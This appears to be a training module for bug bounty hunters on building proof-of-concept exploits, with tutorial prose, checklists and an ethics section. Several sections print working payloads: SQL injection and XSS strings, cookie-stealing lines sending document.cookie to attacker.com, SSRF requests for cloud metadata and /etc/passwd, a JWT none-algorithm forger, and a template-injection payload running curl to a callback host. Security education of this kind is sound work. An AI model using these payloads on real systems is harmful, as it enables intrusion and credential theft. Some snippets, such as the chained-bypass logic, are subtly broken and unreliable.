# Proof-of-Concept Development for Bug Bounty Reports

## Expert Role

Proof-of-Concept (PoC) development is the bridge between identifying a vulnerability and demonstrating its real-world impact. A well-crafted PoC transforms abstract security issues into concrete, reproducible demonstrations that leave no doubt about exploitability. This module covers the complete spectrum of PoC development from simple curl commands to sophisticated automated exploits, with emphasis on creating evidence that triagers can validate quickly and efficiently.

The goal of every PoC is to answer three questions definitively: Is the vulnerability real? How severe is it? What is the worst-case scenario? Your PoC should be minimal enough to be reproducible by anyone, yet complete enough to demonstrate maximum impact. The art lies in finding this balance while respecting scope boundaries and responsible disclosure principles.

In 2026, triagers evaluate dozens of reports daily. Your PoC must stand out through clarity, professionalism, and immediate reproducibility. First impressions matter enormously — a well-structured PoC signals a skilled researcher and builds trust before the triager even begins testing.

## Core Concepts

### PoC Taxonomy

Understanding different PoC types and their appropriate use cases:

**Static PoCs (Documentation-Based)**

These are written instructions that a human follows to reproduce the vulnerability:

1. **curl commands**: Simplest form, executable by anyone with a terminal
2. **Browser steps**: Manual clicking/navigation instructions
3. **Burp Suite sequences**: Request sequences with screenshots
4. **Code snippets**: Python/JavaScript scripts demonstrating exploitation
5. **Video walkthroughs**: Screen recordings showing complete exploitation chain

**Dynamic PoCs (Automated Exploitation)**

These execute automatically and demonstrate impact programmatically:

1. **Exploit scripts**: Complete exploitation tools
2. **Race condition PoCs**: Multi-threaded requests demonstrating concurrency issues
3. **Chain exploits**: Multiple vulnerability chaining demonstrations
4. **Automated scanners**: Custom tools that identify and exploit specific patterns
5. **Fuzzing harnesses**: Input generators that trigger edge cases

### Minimal vs Full PoC Spectrum

| PoC Level | Description | When to Use | Example |
|-----------|-------------|-------------|---------|
| Minimal | Just the vulnerable request | Simple, obvious vulnerabilities | Single curl command |
| Basic | Request + response showing impact | Standard submissions | curl with response highlighting |
| Complete | Full reproduction with context | Complex vulnerabilities | Multi-step process with screenshots |
| Advanced | Automated exploitation tool | Critical severity, chain attacks | Python script with multiple payloads |
| Maximum | Full attack scenario demonstration | Business-critical vulnerabilities | Complete compromise simulation |

### PoC Selection Matrix

Choose your PoC approach based on vulnerability type and impact:

```
Authentication Bypass:
- Primary: curl demonstrating unauthenticated access
- Secondary: Video showing complete bypass flow
- Advanced: Script automating privilege escalation

SQL Injection:
- Primary: sqlmap output or manual injection payload
- Secondary: Screenshots of data extraction
- Advanced: Script extracting complete database schema

Cross-Site Scripting:
- Primary: Payload injection point with alert demonstration
- Secondary: Video showing cookie theft or session hijacking
- Advanced: Automated payload generator for various contexts

Server-Side Request Forgery:
- Primary: curl requesting internal resource
- Secondary: Screenshots of internal service access
- Advanced: Script mapping internal network and exfiltrating data

Business Logic:
- Primary: Step-by-step reproduction with screenshots
- Secondary: Video demonstrating complete bypass
- Advanced: Script automating the attack at scale
```

### Reproducibility Principles

Every PoC must be:

1. **Self-contained**: No external dependencies that may change
2. **Environment-independent**: Works across different systems
3. **Idempotent**: Safe to run multiple times without side effects
4. **Documented**: Clear explanation of each step
5. **Reversible**: Any changes made can be undone
6. **Scope-compliant**: Tests only within authorized boundaries
7. **Time-stamped**: Shows when the PoC was executed
8. **Versioned**: Includes tool versions used

### Evidence Hierarchy

Triagers value different evidence types:

```
Highest Value:
1. Live demonstration (real-time exploitation)
2. Complete exploit code (runnable)
3. Detailed reproduction steps (manual)
4. Screenshots with annotations
5. Video walkthroughs

Medium Value:
6. Request/response pairs
7. Tool output (sqlmap, nuclei, etc.)
8. Network captures
9. Error messages with context
10. Configuration details

Lower Value (but still useful):
11. Theoretical exploitation paths
12. Code review findings
13. Configuration analysis
14. Partial reproduction
15. Third-party validation
```

### PoC Ethics and Boundaries

**DO**:
- Demonstrate vulnerability existence
- Show potential impact realistically
- Use minimal necessary data
- Stay within scope boundaries
- Document all testing activities
- Provide reversible demonstrations when possible

**DON'T**:
- Access or exfiltrate real user data
- Modify production data permanently
- Disrupt service availability
- Test beyond authorized scope
- Share exploitation tools publicly
- Use findings for unauthorized access

## Prerequisites

### Technical Prerequisites

1. **HTTP fundamentals**: Understanding of request/response cycles
2. **Browser developer tools**: Network, Console, Application tabs
3. **Command line proficiency**: curl, wget, and scripting basics
4. **Burp Suite familiarity**: Proxy, Repeater, Intruder, Sequencer
5. **Python basics**: For advanced PoC development
6. **JavaScript fundamentals**: For XSS and client-side vulnerabilities
7. **Network protocol knowledge**: HTTP/HTTPS, WebSocket, gRPC
8. **Authentication mechanisms**: Cookies, tokens, OAuth, SAML
9. **Encoding awareness**: URL, Base64, HTML, Unicode
10. **Version control**: Git for tracking PoC evolution

### Tool Prerequisites

1. **Burp Suite Professional**: Primary intercepting proxy
2. **Python 3.x**: For custom PoC scripts
3. **Node.js**: For JavaScript-based PoCs
4. **curl/wget**: For HTTP request construction
5. **Screen recording software**: OBS, Loom, or similar
6. **Screenshot tool**: With annotation capabilities
7. **Markdown editor**: For PoC documentation
8. **Git**: For version control
9. **Text editor**: VS Code or similar with syntax highlighting
10. **Virtual environment**: Isolated testing environment

### Knowledge Prerequisites

1. **Vulnerability classes**: Understanding of CWE categories
2. **Exploitation techniques**: Common attack patterns
3. **Impact assessment**: Real-world consequence evaluation
4. **Platform rules**: Scope boundaries and testing limits
5. **Legal framework**: CFAA, DMCA, and platform ToS
6. **Responsible disclosure**: Coordinated vulnerability disclosure practices
7. **Report standards**: Platform-specific submission requirements
8. **Triage expectations**: What triagers need to validate findings

## Methodology

### Phase 1: PoC Planning

#### Step 1: Vulnerability Analysis

Before writing any code, fully understand the vulnerability:

```
Analysis Framework:
1. What is the root cause?
2. What is the attack vector?
3. What authentication is required?
4. What is the minimum exploitation path?
5. What is the maximum impact scenario?
6. Are there prerequisites for exploitation?
7. What defenses might exist?
8. How reliable is exploitation?
```

#### Step 2: Evidence Requirements

Determine what evidence the triage team needs:

```
Evidence Checklist:
□ Vulnerability existence proof
□ Impact demonstration
□ Reproducibility verification
□ Scope compliance evidence
□ Non-destructive testing proof
□ Time-stamped execution
□ Tool version documentation
□ Environment details
```

#### Step 3: PoC Architecture

Design your PoC approach:

```
Architecture Decision Tree:
Is the vulnerability simple and obvious?
├─ Yes → Minimal PoC (curl command)
└─ No → Does it require multiple steps?
    ├─ Yes → Complete PoC (multi-step with screenshots)
    └─ No → Is automation needed for impact?
        ├─ Yes → Scripted PoC (Python/Node.js)
        └─ No → Standard PoC (curl + documentation)
```

### Phase 2: PoC Development

#### Step 4: Basic curl PoC

The foundation of most PoCs:

```bash
# Basic GET request demonstrating IDOR
curl -v 'https://target.com/api/users/123/profile' \
  -H 'Authorization: Bearer YOUR_TOKEN' \
  -H 'Accept: application/json'

# Expected response shows other user's data
# Response should include PII of user 123
```

```bash
# POST request demonstrating SQL injection
curl -v 'https://target.com/api/login' \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"username": "admin'\'' OR 1=1--", "password": "anything"}'

# Expected: Authentication bypass
# Response should show successful login
```

**curl PoC Template**:

```bash
#!/bin/bash
# PoC: [Vulnerability Type]
# Target: [Target URL]
# Date: [Discovery Date]
# Researcher: [Your Name]

# Step 1: [Description]
curl -v '[URL]' \
  -H 'Header: Value' \
  -d 'data' \
  2>&1 | tee step1_response.txt

# Step 2: [Description]
curl -v '[URL]' \
  -H 'Authorization: Bearer TOKEN_FROM_STEP1' \
  2>&1 | tee step2_response.txt

# Expected Result:
# [Description of expected outcome]
```

#### Step 5: Browser-Based PoC

For vulnerabilities requiring browser interaction:

```
Browser PoC Template:
1. Open browser developer tools (F12)
2. Navigate to: [URL]
3. Log in with: [Credentials if needed]
4. Open Network tab
5. Perform action: [Specific action]
6. Observe request: [Request details]
7. Modify request: [Modification details]
8. Forward modified request
9. Observe response: [Expected response]
10. Verify impact: [Impact verification steps]
```

**XSS Browser PoC**:

```
1. Navigate to: https://target.com/search
2. Enter in search box: <script>alert('XSS')</script>
3. Click Search button
4. Observe: JavaScript alert dialog appears
5. Open Console tab
6. Verify: document.cookie shows session cookie accessible

Advanced XSS PoC:
1. Navigate to: https://target.com/profile
2. Open Console tab
3. Execute: fetch('https://attacker.com/steal?cookie='+document.cookie)
4. Observe: Network request to attacker domain
5. Verify: Cookie value in request URL
```

#### Step 6: Python PoC Script

For complex or automated demonstrations:

```python
#!/usr/bin/env python3
"""
PoC: [Vulnerability Type]
Target: [Target URL]
Date: [Discovery Date]
Researcher: [Your Name]
"""

import requests
import sys
from datetime import datetime

class VulnerabilityPoC:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.findings = []
    
    def authenticate(self, username, password):
        """Step 1: Authenticate and obtain session"""
        url = f"{self.target}/api/auth/login"
        data = {
            "username": username,
            "password": password
        }
        response = self.session.post(url, json=data)
        if response.status_code == 200:
            print("[+] Authentication successful")
            return True
        else:
            print("[-] Authentication failed")
            return False
    
    def test_vulnerability(self):
        """Step 2: Test for vulnerability"""
        url = f"{self.target}/api/users/OTHER_USER_ID/profile"
        response = self.session.get(url)
        
        if response.status_code == 200:
            data = response.json()
            if "email" in data and "phone" in data:
                print("[+] Vulnerability confirmed!")
                print(f"    Email: {data['email']}")
                print(f"    Phone: {data['phone']}")
                self.findings.append({
                    "type": "IDOR",
                    "endpoint": url,
                    "impact": "Access to other user PII",
                    "evidence": data
                })
                return True
        
        print("[-] Vulnerability not confirmed")
        return False
    
    def demonstrate_impact(self):
        """Step 3: Demonstrate maximum impact"""
        print("\n[*] Demonstrating impact...")
        print("[*] Extracting multiple user records...")
        
        for user_id in range(1000, 1010):
            url = f"{self.target}/api/users/{user_id}/profile"
            response = self.session.get(url)
            if response.status_code == 200:
                data = response.json()
                print(f"    User {user_id}: {data.get('email', 'N/A')}")
    
    def run(self):
        """Execute complete PoC"""
        print(f"[*] Target: {self.target}")
        print(f"[*] Date: {datetime.now().isoformat()}")
        print("[*] Starting PoC execution...\n")
        
        # Step 1: Authentication
        if not self.authenticate("testuser", "testpass"):
            return False
        
        # Step 2: Vulnerability test
        if not self.test_vulnerability():
            return False
        
        # Step 3: Impact demonstration
        self.demonstrate_impact()
        
        print("\n[+] PoC completed successfully")
        print(f"[+] Findings: {len(self.findings)}")
        return True

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://target.com"
    poc = VulnerabilityPoC(target)
    poc.run()
```

#### Step 7: Video PoC

For complex demonstrations requiring visual proof:

```
Video Recording Checklist:
□ Clear screen (close unnecessary applications)
□ Record entire screen or browser window
□ Include timestamps in recording
□ Narrate actions (optional but helpful)
□ Show URL bar in browser recordings
□ Include request/response details
□ Keep recording focused and concise
□ Include title card with PoC details
□ Export in widely compatible format (MP4)

Video Structure:
00:00 - Title card (PoC name, target, date)
00:05 - Introduction (what will be demonstrated)
00:15 - Step 1: [First action]
00:30 - Step 2: [Second action]
00:45 - Step 3: [Third action]
01:00 - Impact demonstration
01:15 - Conclusion
01:20 - End
```

#### Step 8: Screenshot Documentation

Essential for static PoC documentation:

```
Screenshot Best Practices:
1. Capture full context (include URL bar, relevant UI)
2. Annotate with arrows, boxes, highlights
3. Show both before and after states
4. Include timestamps where relevant
5. Redact sensitive information appropriately
6. Use consistent annotation style
7. Provide high-resolution images
8. Name files descriptively

Annotation Guidelines:
- Red boxes for vulnerable areas
- Green arrows for user actions
- Yellow highlights for affected data
- Blue circles for key elements
- Text labels for clarity
- Consistent font and size
```

**Screenshot Sequence for IDOR**:

```
screenshot_01_login.png - Login page
screenshot_02_dashboard.png - User dashboard after login
screenshot_03_request.png - Request in Burp showing user ID parameter
screenshot_04_modified.png - Modified request with different user ID
screenshot_05_response.png - Response showing other user's data
screenshot_06_comparison.png - Side-by-side comparison of legitimate vs exploited
```

### Phase 3: PoC Refinement

#### Step 9: Testing and Validation

Before submission, validate your PoC:

```
Validation Checklist:
□ PoC executes without errors
□ Results are reproducible
□ All steps are clearly documented
□ Screenshots match described steps
□ Video is clear and focused
□ Impact is accurately demonstrated
□ Scope compliance verified
□ No real user data accessed
□ Tool versions documented
□ Environment details recorded
```

#### Step 10: Documentation Enhancement

Polish your PoC documentation:

```
Documentation Structure:
1. Overview section
   - Vulnerability summary
   - Impact statement
   - Prerequisites

2. Environment section
   - Tool versions
   - Operating system
   - Browser version (if applicable)

3. Reproduction section
   - Step-by-step instructions
   - Code snippets
   - Screenshots
   - Video link

4. Impact section
   - Affected users
   - Data exposure
   - Business consequences

5. Remediation section
   - Fix recommendations
   - Detection guidance
```

#### Step 11: Peer Review (If Possible)

Get feedback before submission:

```
Peer Review Checklist:
□ Can someone else reproduce the PoC?
□ Are instructions clear and unambiguous?
□ Is the impact accurately represented?
□ Are screenshots properly annotated?
□ Is the video easy to follow?
□ Does the PoC respect scope boundaries?
□ Is the documentation professional?
```

### Phase 4: PoC by Vulnerability Type

#### SQL Injection PoC

```bash
# Basic SQL injection test
curl -v 'https://target.com/api/search?q=test'\'' OR 1=1--' \
  -H 'Accept: application/json'

# Time-based blind SQL injection
curl -v 'https://target.com/api/search?q=test'\'' AND SLEEP(5)--' \
  -w '\nTime: %{time_total}s\n'

# Union-based SQL injection
curl -v 'https://target.com/api/search?q=-1'\'' UNION SELECT 1,2,3--' \
  -H 'Accept: application/json'
```

```python
# SQL injection automation PoC
import requests
import time

def test_sqli(url):
    """Test for SQL injection vulnerabilities"""
    payloads = {
        "boolean": "' OR 1=1--",
        "time": "' AND SLEEP(5)--",
        "union": "' UNION SELECT NULL,NULL,NULL--",
        "error": "' AND 1=CONVERT(int,(SELECT @@version))--"
    }
    
    for name, payload in payloads.items():
        print(f"[*] Testing {name} payload...")
        start = time.time()
        
        response = requests.get(
            url,
            params={"q": payload},
            headers={"Accept": "application/json"}
        )
        
        elapsed = time.time() - start
        
        if name == "time" and elapsed > 4:
            print(f"[+] Time-based SQLi confirmed ({elapsed:.2f}s)")
        elif name == "boolean" and len(response.text) > 100:
            print(f"[+] Boolean-based SQLi confirmed")
        elif "error" in response.text.lower():
            print(f"[+] Error-based SQLi confirmed")
```

#### XSS PoC

```html
<!-- Basic XSS payload -->
<script>alert('XSS')</script>

<!-- Cookie theft payload -->
<script>
  new Image().src='https://attacker.com/steal?c='+document.cookie;
</script>

<!-- DOM-based XSS -->
<img src=x onerror="alert('XSS')">

<!-- Stored XSS in profile field -->
"><script>alert('XSS')</script>

<!-- Polyglot payload -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//
```

```javascript
// XSS automation PoC
const payloads = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert("XSS")>',
  '<svg onload=alert("XSS")>',
  '"><script>alert("XSS")</script>',
  "javascript:alert('XSS')",
  '{{7*7}}',  // Template injection
  '${7*7}',   // Expression language injection
];

function testXSS(endpoint, param) {
  payloads.forEach(payload => {
    const url = new URL(endpoint);
    url.searchParams.set(param, payload);
    
    fetch(url)
      .then(r => r.text())
      .then(html => {
        if (html.includes(payload)) {
          console.log(`[+] XSS confirmed with: ${payload}`);
        }
      });
  });
}
```

#### SSRF PoC

```bash
# Basic SSRF test
curl -v 'https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/'

# SSRF with protocol abuse
curl -v 'https://target.com/api/fetch?url=file:///etc/passwd'

# SSRF with DNS rebinding
curl -v 'https://target.com/api/fetch?url=http://rebind.attacker.com'

# SSRF with cloud metadata
curl -v 'https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
```

```python
# SSRF automation PoC
import requests

def test_ssrf(target_url):
    """Test for SSRF vulnerabilities"""
    internal_targets = [
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost:8080/admin",
        "http://127.0.0.1:3306",
        "file:///etc/passwd",
        "http://internal-service:8080/api/health"
    ]
    
    for internal_url in internal_targets:
        print(f"[*] Testing SSRF to: {internal_url}")
        
        response = requests.get(
            target_url,
            params={"url": internal_url},
            headers={"Accept": "application/json"}
        )
        
        if response.status_code == 200:
            if "ami-id" in response.text or "root:" in response.text:
                print(f"[+] SSRF confirmed! Accessed: {internal_url}")
                print(f"    Response: {response.text[:200]}")
```

#### Authentication Bypass PoC

```bash
# JWT none algorithm bypass
curl -v 'https://target.com/api/admin' \
  -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.'

# Path traversal bypass
curl -v 'https://target.com/api/admin/../../../etc/passwd'

# HTTP method override
curl -v 'https://target.com/api/users/123' \
  -X GET \
  -H 'X-HTTP-Method-Override: DELETE'

# Header injection
curl -v 'https://target.com/api/admin' \
  -H 'X-Original-URL: /admin' \
  -H 'X-Rewrite-URL: /admin'
```

#### Business Logic PoC

```python
# Business logic vulnerability PoC
import requests

def test_business_logic(target_url):
    """Test for business logic vulnerabilities"""
    
    # Test 1: Price manipulation
    print("[*] Testing price manipulation...")
    response = requests.post(
        f"{target_url}/api/checkout",
        json={
            "product_id": "123",
            "quantity": 1,
            "price": 0.01  # Manipulated price
        }
    )
    
    if response.status_code == 200:
        print("[+] Price manipulation successful")
    
    # Test 2: Quantity overflow
    print("[*] Testing quantity overflow...")
    response = requests.post(
        f"{target_url}/api/checkout",
        json={
            "product_id": "123",
            "quantity": -1  # Negative quantity
        }
    )
    
    if response.status_code == 200:
        print("[+] Quantity overflow successful")
    
    # Test 3: Race condition
    print("[*] Testing race condition...")
    import concurrent.futures
    
    def redeem_coupon():
        return requests.post(
            f"{target_url}/api/redeem",
            json={"coupon": "DISCOUNT50"}
        )
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(redeem_coupon) for _ in range(10)]
        results = [f.result() for f in concurrent.futures.as_completed(futures)]
        
        successful = sum(1 for r in results if r.status_code == 200)
        if successful > 1:
            print(f"[+] Race condition: {successful} successful redemptions")
```

## Tool Arsenal

### Essential PoC Development Tools

#### Request Construction

```
curl: HTTP request construction and execution
httpie: User-friendly HTTP client
wget: Non-interactive HTTP downloading
xh: Modern HTTP client (httpie alternative)
```

#### Proxy and Interception

```
Burp Suite Professional: Primary intercepting proxy
OWASP ZAP: Open-source alternative
mitmproxy: Console-based proxy
Charles Proxy: GUI-based proxy
Fiddler: Windows-based proxy
```

#### Scripting Languages

```
Python: requests, httpx, asyncio libraries
Node.js: axios, fetch, got libraries
Bash/curl: Simple request scripting
PowerShell: Windows-based HTTP clients
Ruby: Net::HTTP, RestClient libraries
```

#### Screenshot and Recording

```
Greenshot: Windows screenshot tool
Snagit: Professional screenshot capture
OBS Studio: Screen recording
Loom: Video recording and sharing
ShareX: Screenshot and recording
```

#### Annotation and Documentation

```
GIMP: Image annotation
Paint.NET: Simple annotation
draw.io: Diagram creation
Mermaid: Markdown diagrams
Typora: Markdown editing
```

### Tool Configuration Templates

#### Burp Suite PoC Configuration

```
Project Settings:
- Proxy intercept: Off (for passive recording)
- HTTP history: Full logging enabled
- WebSocket history: Enabled
- Proxy options: Invisible proxy for automated tools

Extension Configuration:
- Logger++: Request/response logging
- Autorize: Authorization testing
- Turbo Intruder: High-speed testing
- JSON Beautifier: Response formatting
```

#### Python Environment Setup

```bash
# Virtual environment for PoC development
python -m venv poc_env
source poc_env/bin/activate  # Linux/Mac
poc_env\Scripts\activate     # Windows

# Install required packages
pip install requests httpx aiohttp beautifulsoup4 colorama

# Project structure
poc_project/
├── poc.py
├── requirements.txt
├── README.md
├── screenshots/
│   ├── 01_login.png
│   ├── 02_request.png
│   └── 03_response.png
└── videos/
    └── poc_recording.mp4
```

## Case Studies

### Case Study 1: Simple IDOR PoC

**Vulnerability**: IDOR in user profile endpoint

**PoC Approach**: curl command with minimal documentation

**Discovery**: While testing API endpoints, researcher noticed predictable user IDs in profile requests.

**PoC Development**:

```bash
# Step 1: Authenticate and obtain token
TOKEN=$(curl -s 'https://target.com/api/auth/login' \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"email":"researcher@test.com","password":"test123"}' | jq -r '.token')

# Step 2: Access own profile (baseline)
curl -s 'https://target.com/api/users/CURRENT_USER_ID/profile' \
  -H "Authorization: Bearer $TOKEN" | jq .

# Step 3: Access other user's profile (exploitation)
curl -s 'https://target.com/api/users/OTHER_USER_ID/profile' \
  -H "Authorization: Bearer $TOKEN" | jq .
```

**Screenshot Evidence**:
1. Own profile showing expected data
2. Other user's profile showing PII
3. Side-by-side comparison

**Result**: Triaged as High severity, $5,000 bounty

**Key Takeaways**:
- Simple curl commands can demonstrate clear vulnerabilities
- Side-by-side comparison provides immediate visual impact
- Minimal documentation was sufficient for this straightforward issue

### Case Study 2: Complex Business Logic PoC

**Vulnerability**: Race condition allowing multiple coupon redemptions

**PoC Approach**: Multi-threaded Python script with video demonstration

**Discovery**: Researcher noticed the coupon redemption endpoint had no rate limiting or idempotency checks.

**PoC Development**:

```python
import requests
import concurrent.futures
import time
from statistics import mean

class RaceConditionPoC:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.results = []
    
    def authenticate(self):
        """Get authentication token"""
        response = self.session.post(
            f"{self.target}/api/auth/login",
            json={"email": "researcher@test.com", "password": "test123"}
        )
        return response.json()["token"]
    
    def redeem_coupon(self, coupon_code):
        """Attempt to redeem coupon"""
        start = time.time()
        response = self.session.post(
            f"{self.target}/api/redeem",
            json={"coupon": coupon_code},
            headers={"Authorization": f"Bearer {self.token}"}
        )
        elapsed = time.time() - start
        
        return {
            "status": response.status_code,
            "response": response.json(),
            "time": elapsed,
            "timestamp": time.time()
        }
    
    def test_race_condition(self, coupon_code, attempts=20):
        """Test for race condition with concurrent requests"""
        print(f"[*] Testing race condition with {attempts} concurrent requests...")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=attempts) as executor:
            futures = [
                executor.submit(self.redeem_coupon, coupon_code)
                for _ in range(attempts)
            ]
            
            self.results = [
                f.result() for f in concurrent.futures.as_completed(futures)
            ]
        
        # Analyze results
        successful = [r for r in self.results if r["status"] == 200]
        failed = [r for r in self.results if r["status"] != 200]
        
        print(f"[+] Results: {len(successful)} successful, {len(failed)} failed")
        
        if len(successful) > 1:
            print("[+] Race condition CONFIRMED!")
            print(f"    Average response time: {mean([r['time'] for r in self.results]):.3f}s")
            return True
        
        return False
    
    def demonstrate_impact(self):
        """Show impact of race condition"""
        print("\n[*] Demonstrating impact...")
        
        # Show account balance before
        balance_before = self.get_balance()
        print(f"    Balance before: ${balance_before:.2f}")
        
        # Execute race condition
        self.test_race_condition("DISCOUNT50")
        
        # Show account balance after
        balance_after = self.get_balance()
        print(f"    Balance after: ${balance_after:.2f}")
        print(f"    Total discount: ${balance_before - balance_after:.2f}")
    
    def run(self):
        """Execute complete PoC"""
        print("[*] Starting Race Condition PoC")
        print(f"[*] Target: {self.target}")
        print(f"[*] Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        
        # Authenticate
        self.token = self.authenticate()
        
        # Test and demonstrate
        if self.test_race_condition("DISCOUNT50"):
            self.demonstrate_impact()
        
        print("\n[+] PoC completed")

if __name__ == "__main__":
    poc = RaceConditionPoC("https://target.com")
    poc.run()
```

**Video Documentation**:
- 2-minute video showing the race condition execution
- Account balance before and after
- Multiple redemption confirmations

**Result**: Triaged as Critical severity, $15,000 bounty

**Key Takeaways**:
- Complex vulnerabilities require sophisticated PoCs
- Video documentation provides irrefutable proof
- Impact quantification strengthens severity justification

### Case Study 3: Authentication Bypass Chain

**Vulnerability**: JWT algorithm confusion + path traversal = complete authentication bypass

**PoC Approach**: Multi-stage Python script with detailed documentation

**Discovery**: Researcher noticed JWT tokens using "none" algorithm were accepted, combined with path traversal in token validation endpoint.

**PoC Development**:

```python
import jwt
import requests
import base64
import json

class AuthBypassPoC:
    def __init__(self, target_url):
        self.target = target_url
    
    def create_none_algorithm_token(self, payload):
        """Create JWT with none algorithm"""
        # Create header with none algorithm
        header = {"alg": "none", "typ": "JWT"}
        
        # Encode header and payload
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(header).encode()
        ).rstrip(b'=').decode()
        
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).rstrip(b'=').decode()
        
        # Create token without signature
        token = f"{header_b64}.{payload_b64}."
        return token
    
    def test_algorithm_confusion(self):
        """Test JWT none algorithm acceptance"""
        print("[*] Testing JWT none algorithm...")
        
        # Create token with admin privileges
        payload = {
            "sub": "1234567890",
            "name": "Admin User",
            "role": "admin",
            "iat": 1516239022
        }
        
        token = self.create_none_algorithm_token(payload)
        print(f"[*] Generated token: {token[:50]}...")
        
        # Test with protected endpoint
        response = requests.get(
            f"{self.target}/api/admin/users",
            headers={"Authorization": f"Bearer {token}"}
        )
        
        if response.status_code == 200:
            print("[+] None algorithm accepted!")
            print(f"    Response: {response.text[:200]}")
            return True
        
        print("[-] None algorithm rejected")
        return False
    
    def test_path_traversal_bypass(self):
        """Test path traversal in token validation"""
        print("\n[*] Testing path traversal bypass...")
        
        # Traversal payload
        traversal = "../../../api/internal/validate"
        
        # Legitimate token
        response = requests.get(
            f"{self.target}/{traversal}",
            headers={"Authorization": "Bearer LEGITIMATE_TOKEN"}
        )
        
        if response.status_code == 200:
            print("[+] Path traversal bypass successful!")
            return True
        
        print("[-] Path traversal bypass failed")
        return False
    
    def chain_bypass(self):
        """Chain vulnerabilities for complete bypass"""
        print("\n[*] Chaining vulnerabilities...")
        
        # Step 1: Get legitimate token from low-privilege account
        login_response = requests.post(
            f"{self.target}/api/auth/login",
            json={"email": "user@test.com", "password": "password123"}
        )
        legitimate_token = login_response.json()["token"]
        
        # Step 2: Modify token with path traversal
        modified_token = legitimate_token.replace(
            "/validate",
            "/admin/validate"
        )
        
        # Step 3: Access admin endpoint
        response = requests.get(
            f"{self.target}/api/admin/dashboard",
            headers={"Authorization": f"Bearer {modified_token}"}
        )
        
        if response.status_code == 200:
            print("[+] Complete auth bypass achieved!")
            print(f"    Admin data: {response.text[:200]}")
            return True
        
        return False
    
    def run(self):
        """Execute complete PoC"""
        print("[*] Authentication Bypass PoC")
        print(f"[*] Target: {self.target}\n")
        
        results = {
            "none_algorithm": self.test_algorithm_confusion(),
            "path_traversal": self.test_path_traversal_bypass(),
            "chained_bypass": self.chain_bypass()
        }
        
        print("\n[*] Results Summary:")
        for test, result in results.items():
            status = "[+]" if result else "[-]"
            print(f"    {status} {test}")
```

**Documentation**:
- Detailed JWT structure explanation
- Step-by-step reproduction guide
- Screenshots of each bypass stage
- Video showing complete chain

**Result**: Triaged as Critical severity, $25,000 bounty

**Key Takeaways**:
- Chained vulnerabilities require comprehensive PoCs
- Technical documentation builds credibility
- Multiple bypass methods demonstrate thorough testing

## Advanced Topics

### Advanced PoC Techniques

#### Race Condition Exploitation

```python
import asyncio
import aiohttp
import time

class AdvancedRaceConditionPoC:
    def __init__(self, target_url):
        self.target = target_url
        self.results = []
    
    async def make_request(self, session, endpoint, data):
        """Single async request"""
        start = time.time()
        async with session.post(
            f"{self.target}{endpoint}",
            json=data
        ) as response:
            elapsed = time.time() - start
            result = await response.json()
            self.results.append({
                "status": response.status,
                "time": elapsed,
                "result": result
            })
    
    async def race_attack(self, endpoint, data, concurrent=50):
        """Execute race condition attack"""
        async with aiohttp.ClientSession() as session:
            tasks = [
                self.make_request(session, endpoint, data)
                for _ in range(concurrent)
            ]
            await asyncio.gather(*tasks)
        
        # Analyze results
        successful = [r for r in self.results if r["status"] == 200]
        return len(successful) > 1
    
    def analyze_timing(self):
        """Analyze timing patterns"""
        times = [r["time"] for r in self.results]
        return {
            "min": min(times),
            "max": max(times),
            "avg": sum(times) / len(times),
            "spread": max(times) - min(times)
        }
```

#### Second-Order Vulnerabilities

```python
class SecondOrderPoC:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
    
    def inject_payload(self, payload):
        """Step 1: Inject malicious payload"""
        response = self.session.post(
            f"{self.target}/api/profile",
            json={"username": payload}
        )
        return response.status_code == 200
    
    def trigger_execution(self):
        """Step 2: Trigger payload execution"""
        response = self.session.get(
            f"{self.target}/api/profile/username"
        )
        return response.text
    
    def verify_execution(self):
        """Step 3: Verify payload executed"""
        # Check if injected script executed
        response = self.session.get(
            f"{self.target}/api/logs"
        )
        return "executed" in response.text
    
    def run_chain(self):
        """Execute complete second-order chain"""
        # Step 1: Inject
        self.inject_payload("<script>alert('XSS')</script>")
        
        # Step 2: Trigger (different endpoint/time)
        time.sleep(60)  # Wait for storage
        result = self.trigger_execution()
        
        # Step 3: Verify
        executed = self.verify_execution()
        
        return executed
```

#### Out-of-Band Exploitation

```python
import threading
import socket
import requests

class OOBExploitationPoC:
    def __init__(self, callback_url):
        self.callback_url = callback_url
        self.received = []
    
    def start_listener(self, port=8080):
        """Start callback listener"""
        def listener():
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind(("0.0.0.0", port))
                s.listen()
                
                while True:
                    conn, addr = s.accept()
                    data = conn.recv(1024).decode()
                    self.received.append({
                        "from": addr,
                        "data": data,
                        "time": time.time()
                    })
                    conn.close()
        
        thread = threading.Thread(target=listener, daemon=True)
        thread.start()
        return thread
    
    def inject_callback(self, target_url, injection_point):
        """Inject OOB callback payload"""
        payload = f"{{{{constructor.constructor('return this')()eval('require(\"child_process\").exec(\"curl {self.callback_url}\")')}}}}"
        
        response = requests.get(
            target_url,
            params={injection_point: payload}
        )
        return response.status_code == 200
    
    def verify_exfiltration(self, timeout=30):
        """Verify data exfiltration"""
        start = time.time()
        while time.time() - start < timeout:
            if self.received:
                return True
            time.sleep(1)
        return False
```

### PoC Automation Frameworks

#### Template-Based PoC Generation

```python
class PoCTemplate:
    def __init__(self, vulnerability_type):
        self.type = vulnerability_type
        self.steps = []
        self.evidence = []
